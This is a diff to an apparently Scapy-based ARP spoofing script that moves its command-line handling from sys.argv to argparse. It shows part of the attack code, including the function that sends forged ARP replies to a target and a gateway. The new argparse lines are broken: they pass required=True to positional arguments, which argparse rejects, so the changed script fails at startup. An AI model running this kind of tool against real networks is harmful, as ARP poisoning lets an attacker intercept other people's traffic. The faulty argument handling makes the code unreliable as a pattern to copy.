@@ -2,6 +2,7 @@ from scapy.all import *
 from scapy.layers.l2 import Ether, ARP, getmacbyip
 from scapy.sendrecv import sendp, send
 import getmac
+import argparse
 
 
 def spoof(native_mac, target_mac, gateway_mac):
@@ -16,12 +17,6 @@ def restore(target_mac, gateway_mac):
     restore_gateway = Ether(dst=gateway_mac) / ARP(op=2, psrc=target_ip, hwsrc=target_mac, pdst=gateway_ip, hwdst=gateway_mac)
     send(restore_target)
     send(restore_gateway)
-
-
-def show_help():
-    print("\nUsage:\n python3 arpspoof.py target_ip gateway_ip interface\n")
-    sys.exit()
-
 
 def run():
     if os.geteuid() != 0:
@@ -50,9 +45,12 @@ def run():
 
 
 if __name__ == '__main__':
-    if len(sys.argv) < 2:
-        show_help()
-    target_ip = sys.argv[1]
-    gateway_ip = sys.argv[2]
-    interface = sys.argv[3]
+    parser = argparse.ArgumentParser(description='ARP spoofing script, specify the target ip, gateway ip and interface')
+    parser.add_argument("target_ip", help="target ip address", required=True, type=str)
+    parser.add_argument("gateway_ip", help="gateway ip address", required=True, type=str)
+    parser.add_argument("interface", help="specified he interface on your device", required=True, type=str)
+    args = parser.parse_args()
+    target_ip = args.target_ip
+    gateway_ip = args.gateway_ip
+    interface = args.interface
     run()
